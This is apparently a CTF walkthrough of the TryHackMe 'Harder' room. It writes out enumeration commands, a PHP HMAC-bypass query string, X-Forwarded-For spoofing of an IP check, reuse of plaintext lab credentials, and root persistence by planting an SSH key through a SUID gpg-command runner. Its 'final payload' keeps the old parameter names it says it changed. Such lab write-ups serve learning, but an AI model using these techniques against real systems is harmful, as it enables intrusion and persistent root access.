---
published: true
title: Harder - TryHackMe Walkthrough
author: F3dai
category: Writeup
image: 'https://imgur.com/T7XZHgE.png'
---
Harder - "Real pentest findings combined. The machine is completely inspired by real world pentest findings. Perhaps you will consider them very challenging but without any rabbit holes. Once you have a shell it is very important to know which underlying linux distribution is used and where certain configurations are located.
Hints to the initial foodhold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists (https://tools.kali.org/password-attacks/seclists). Read the source with care." 

URL: [harder](https://tryhackme.com/room/harder)

Difficulty: Medium

Author: arcc

## Enumeration

We are given the IP 10.10.16.92. Add this to the /etc/hosts file. Let’s scan the open ports with the following command:

<pre>sudo nmap -v -sV -sS -p- -T4 -sC -oN portscan hard.thm</pre>

<pre>PORT   STATE SERVICE VERSION
2/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:8c:1e:07:1d:f3:de:8a:01:f1:50:51:e4:e6:00:fe (RSA)
|   256 e6:5d:ea:6c:83:86:20:de:f0:f0:3a:1e:5f:7d:47:b5 (ECDSA)
|_  256 e9:ef:d3:78:db:9c:47:20:7e:62:82:9d:8f:6f:45:6a (ED25519)
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

We see that 2 ssh services are running on the machine as well as a webserver on port 80, running nginx 1.18.0.

![web page](https://imgur.com/8381l5N.png)

I run a directory scan but the results aren't helpful:

<pre>wfuzz -u http://hard.thm/FUZZ -w /usr/share/wordlists/wfuzz/general/big.txt -c</pre>

![wfuzz](https://imgur.com/pqQLCGH.png)

It looks like everything is being redirected to an error page, no matter what.

Let's take a look at the request for this page. I inspect-element and look at the network tab to analyse the headers:

![web request](https://imgur.com/0mAOKDS.png)

<pre>domain=pwd.harder.local</pre>

Let's change our etc hosts file to use the domain we saw in the *Set-Cookie* field on our web request.

<pre>sudo nano /etc/hosts</pre>

<pre>10.10.153.166 hard.thm pwd.harder.local</pre>

Let's revisit the page:

![re visit](https://imgur.com/mffpIl3.png)

Now we are prompted with a login page. 

Anytime you are asked for credentials, it's always worth trying admin:admin. Works 1 in a 100 times, like this CTF.

We're then sent to a page which says:

<pre>extra security in place. our source code will be reviewed soon ...</pre>

There is nothing else on the page. I tried another directory scan since we know about pwd.harder.local but nothing from that either.

I don't see anymore leads so let's rerun a directory scan but with a better wordlist. I didn't see this when I first started but there is a hint on the Tryhackme page about using a good wordlist.

Also, the *source code will be reviewed soon* hints at something git related?

Here is my new wfuzz command which ignores 404 and 400:

<pre>wfuzz -u http://pwd.harder.local/FUZZ -w ~/Documents/SecLists/Fuzzing/fuzz-Bo0oM.txt -c --hc 404,400</pre>

I picked fuzz-Bo0oM.txt becasue I saw a load of 'hidden' directory names including git. Here are the results:

![new wfuzz](https://imgur.com/8igCSKC.png)

Great, they have left their git repo on the webserver :)

Now we can try and download all of their git files using the following script:

[Git Repository Downloader - Github](https://github.com/SLMT/ctf-tools/tree/master/git-repository-downloader)

<pre>wget https://raw.githubusercontent.com/SLMT/ctf-tools/master/git-repository-downloader/git-downloader.py

For some reason, this script had the wrong way slashes so I edited the script to use / instead of \, otherwise it wasn't downloading the files properly. I'm pretty sure there are better scripts to use but I chose this. 

<pre>python2 git-downloader.py http://pwd.harder.local</pre>

Now that we have all the git files, we can enumerate to find some more info.

I found some information about a previous commit: 

<pre>┌─[✗]─[user@parrot]─[~/tryhackme/harder/pwd.harder.local/.git]
└──╼ $git log
commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -&gt; master)
Author: evs &lt;evs@harder.htb&gt;
Date:   Thu Oct 3 18:12:23 2019 +0300

    add gitignore

commit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
Author: evs &lt;evs@harder.htb&gt;
Date:   Thu Oct 3 18:11:32 2019 +0300

    add extra security

commit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
Author: evs &lt;evs@harder.htb&gt;
Date:   Thu Oct 3 14:00:52 2019 +0300

    added index.php</pre>

I tried reverting the commits but didn't get anywhere. Maybe a rabbit hole.

Take a look at hmac.php:

<pre>&lt;?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print(&quot;missing get parameter&quot;);
   die();
}

require(&quot;secret.php&quot;); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', Array(), $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print(&quot;extra security check failed&quot;);
  die();
}
?&gt;</pre>

## user.txt

Researching some ways for bypassing an HMAC check, I came across this article:

[Spot The Bug challenge 2018 warm-up](https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up#spot-the-bug-2018)

To make **hash_hmac** return **false**, we need to supply an array for the **nonce** value. 

We need to generate a new HMAC like the following:

<pre>HMAC = hash_hmac(SHA256, $_POST['host'], false)</pre>

So, according to the article, we can use this new generated HMAC:

<pre>hash_hmac('sha256', "securify.nl", false) = c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5</pre>

This is an example of a payload, taken from the website:

<pre>?nonce[]=&hostname=securify.nl&hmac=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5</pre>

Let's change the variable names as our code will be slightly different. For example, nonce = n, hostname = host, hmac = h. This is our final payload:

<pre>?nonce[]=&hostname=securify.nl&hmac=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5</pre>

![final payload hmac](https://imgur.com/kgwc0PC.png)

We have some new credentials: 

evs:9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm

I also added this domain to my etc hosts file: shell.harder.local/

Logging in with the new credentials, we see this:

![IP not allowed](https://imgur.com/F2rfOrY.png)

This could be a simple WAF, where we can forge our IP by intercepting and modifying the web request. Here is what I captured with Burpsuite:

<pre>POST /index.php HTTP/1.1
Host: shell.harder.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://shell.harder.local/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://shell.harder.local
DNT: 1
Connection: close
Cookie: PHPSESSID=p9pugodqv3p3do7k17pk6tvn10; login_user=evs; login_pass=2f9bb0db1b60ebadded465d641cc65eb
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

action=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm&remember=on</pre>

Sent this to the repeater so I could try to add some new parameters, which could be one of the following: X-Originating-IP, X-Forwarded-For, X-Remote-IP, X-Remote-Addr. 

Adding the following line did the trick:

<pre>X-Forwarded-For: 10.10.10.10</pre>

![repeater](https://imgur.com/UyDqUNb.png)

Here is the rendered HTML:

![Rendered](https://imgur.com/heOh1VY.png)

Looks like we can execute commands. Let's get the request for this new page by forwarding our modified request and intercepting again:

![new request RCE](https://imgur.com/SIREA7z.png)

I'll send this to repeater again so we can test out some commands, making sure I am still 10.10.10.10. This is the rendered page in burp suite:

![Execute Command burp](https://imgur.com/O6pCMjN.png)

I couldn't upload my own payload nor add .ssh (since ssh was open?) so I did some more enumeration.

I had a look at /etc/periodic and found an interesting file with some info about using ssh:

<pre>#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server

# for authentication use ssh with user &quot;evs&quot; and password &quot;U6j1brxGqbsUA$pMuIodnb$SZB4$bw14&quot;</pre>

<pre>evs:U6j1brxGqbsUA$pMuIodnb$SZB4$bw14</pre>

![ssh creds](https://imgur.com/NeIwUAs.png)

## root.txt

Did some enumeration, I looked for any interesting SUID binaries with the following command:

<pre>find / -perm -4000 -type f 2>/dev/null</pre>

And found this binary:

<pre>/usr/local/bin/execute-crypted</pre>

Running this binary gave the following result:

<pre>harder:~$ /usr/local/bin/execute-crypted
[*] Current User: root
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami > command
[-] Encrypt the file and run the command: execute-crypted command.gpg
</pre>

Cool, so let's do that?

<pre>echo "cat /root/root.txt" > command
gpg -c command
/usr/local/bin/execute-crypted command.gpg</pre>

And we got root flag. Pretty easy. However, I'm not satisfied as I am not root. Since ssh is open maybe we can add our own key for root? Generate a key:

<pre>ssh-keygen
f3dai
cat f3dai.pub</pre>

Now we want to add this to /root/.ssh. Assuming .ssh isn't there, we can create the directory and echo our key into a file called authorized_keys:

<pre>echo &quot;mkdir /root/.ssh &amp;&amp; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQ  [SNIPPED]  ls4mfC2Xb1bufCM= user@parrot &gt; /root/.ssh/authorized_keys&quot; &gt; command
gpg -c command
/usr/local/bin/execute-crypted command.gpg</pre>

Our key should be in root's ssh key file so connect by ssh:

<pre>ssh -i f3dai root@hard.thm</pre>

We are root:

![root](https://imgur.com/p86co9D.png)




